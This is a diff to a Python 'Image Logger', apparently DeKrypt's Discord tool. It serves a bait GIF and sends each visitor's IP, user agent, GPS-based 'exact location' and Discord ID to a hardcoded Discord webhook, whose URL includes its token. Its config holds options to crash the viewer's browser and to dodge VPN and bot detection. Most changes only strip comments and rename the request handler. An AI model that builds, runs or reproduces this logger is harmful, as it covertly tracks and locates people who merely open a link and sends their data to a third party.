@@ -12,32 +12,31 @@ __version__ = "v2.0"
 __author__ = "DeKrypt"
 
 config = {
-    # BASE CONFIG #
     "webhook": "https://ptb.discord.com/api/webhooks/1336431227338752036/W29f9ZpLcY7GBNyYqpiGde4ny6v4XK4VPKZgGsP9OThQNe8LdvQEf4cTAn62bkCy8h7y",
-    "image": "https://media1.tenor.com/m/tZGM8sQwlFwAAAAd/spongebob-cant-wait.gif", # You can also have a custom image by using a URL argument
-    "imageArgument": True,  # Allows you to use a URL argument to change the image
-    "username": "Image Logger",  # Set this to the name you want the webhook to have
-    "color": 0x00FFFF,  # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "image": "https://media1.tenor.com/m/tZGM8sQwlFwAAAAd/spongebob-cant-wait.gif", 
+    "imageArgument": True,  
+    "username": "Image Logger",  
+    "color": 0x00FFFF,  
 
-    "crashBrowser": False,  # Tries to crash/freeze the user's browser, may not work
-    "accurateLocation": True,  # Uses GPS to find users exact location (Real Address, etc.)
+    "crashBrowser": False,  
+    "accurateLocation": True,  
     "message": {
         "doMessage": False,
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",  # Message to show
+        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",  
         "richMessage": True,
     },
-    "vpnCheck": 1,  # Prevents VPNs from triggering the alert
-    "linkAlerts": True,  # Alert when someone sends the link (May not work if the link is sent a bunch of times)
-    "buggedImage": False,  # Shows a loading image as the preview when sent in Discord
-    "antiBot": 1,  # Prevents bots from triggering the alert
+    "vpnCheck": 1,  
+    "linkAlerts": True,  
+    "buggedImage": False,  
+    "antiBot": 1,  
 
     "redirect": {
-        "redirect": False,  # Redirect to a webpage?
-        "page": "https://your-link.here",  # Link to the webpage to redirect to
+        "redirect": False,  
+        "page": "https://your-link.here",  
     },
 }
 
-blacklistedIPs = ("27", "104", "143", "164")  # Blacklisted IPs.
+blacklistedIPs = ("27", "104", "143", "164")  
 
 def botCheck(ip, useragent):
     if ip.startswith(("34", "35")):
@@ -63,7 +62,7 @@ def reportError(error):
 
 
 # New `makeReport` function with discord_id, discord_username, and timestamp
-def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, discord_id="Unknown", discord_username="Unknown"):
+def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=None, discord_id="Unknown", discord_username="Unknown"):
     if ip.startswith(blacklistedIPs):
         return
 
@@ -102,7 +101,8 @@ binaries = {
 
 class ImageLoggerAPI(BaseHTTPRequestHandler):
     
-    def handleRequest(self):
+    # Refactor this to `do_GET` or another appropriate method.
+    def do_GET(self):
         try:
             if config["imageArgument"]:
                 s = self.path
@@ -177,4 +177,3 @@ height: 100vh;
                 self.wfile.write(data)
         except Exception as e:
             reportError(traceback.format_exc())
-
